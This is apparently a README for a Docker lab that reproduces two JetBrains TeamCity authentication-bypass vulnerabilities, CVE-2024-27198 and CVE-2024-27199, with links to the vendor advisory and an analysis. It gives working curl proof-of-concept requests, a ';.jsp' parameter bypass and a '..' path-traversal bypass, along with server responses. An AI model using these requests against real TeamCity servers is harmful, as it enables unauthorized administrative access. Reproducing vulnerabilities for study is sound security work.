# TeamCity On-Premises (CVE-2024-27198 and CVE-2024-27199)

> Advisory https://blog.jetbrains.com/teamcity/2024/03/additional-critical-security-issues-affecting-teamcity-on-premises-cve-2024-27198-and-cve-2024-27199-update-to-2023-11-4-now

> Analysis https://blog.rapid7.com/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/

## Usage

Starup with,

```bash
docker compose up
```

access `http://localhost:8112` and create a admin account.

### CVE-2024-27198

Bypass with `jsp` parameter

```bash
curl -ik http://localhost:8112/hax?jsp=/app/rest/server;.jsp

HTTP/1.1 200
TeamCity-Node-Id: MAIN_SERVER
Cache-Control: no-store
Content-Type: application/xml;charset=ISO-8859-1
Content-Language: en-US
Content-Length: 794
Date: Wed, 06 Mar 2024 04:24:46 GMT

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><server version="2023.11.3 (build 147512)" versionMajor="2023" versionMinor="11" startTime="20240305T160900+0000" currentTime="20240306T042446+0000" buildNumber="147512" buildDate="20240129T000000+0000" internalId="4f0659b8-7b77-4bec-9ec5-e8e5564aad27" role="main_node" webUrl="http://localhost:8111" artifactsUrl=""><projects href="/app/rest/projects"/><vcsRoots href="/app/rest/vcs-roots"/><builds href="/app/rest/builds"/><users href="/app/rest/users"/><userGroups href="/app/rest/userGroups"/><agents href="/app/rest/agents"/><buildQueue href="/app/rest/buildQueue"/><agentPools href="/app/rest/agentPools"/><investigations href="/app/rest/investigations"/><mutes href="/app/rest/mutes"/><nodes href="/app/rest/server/nodes"/></server>
```

### CVE-2024-2719

Normally, we need authroization to accessing `/admin/diagnostic.jsp`,

```bash
curl -ik --path-as-is http://localhost:8112/admin/diagnostic.jsp
HTTP/1.1 401
TeamCity-Node-Id: MAIN_SERVER
WWW-Authenticate: Basic realm="TeamCity"
WWW-Authenticate: Bearer realm="TeamCity"
Cache-Control: no-store
Content-Type: text/plain;charset=UTF-8
Transfer-Encoding: chunked
Date: Wed, 06 Mar 2024 04:19:52 GMT

Authentication required
To login manually go to "/login.html" page
```

it can be bypass with `..`

```bash
curl -ik --path-as-is http://localhost:8112/res/../admin/diagnostic.jsp
```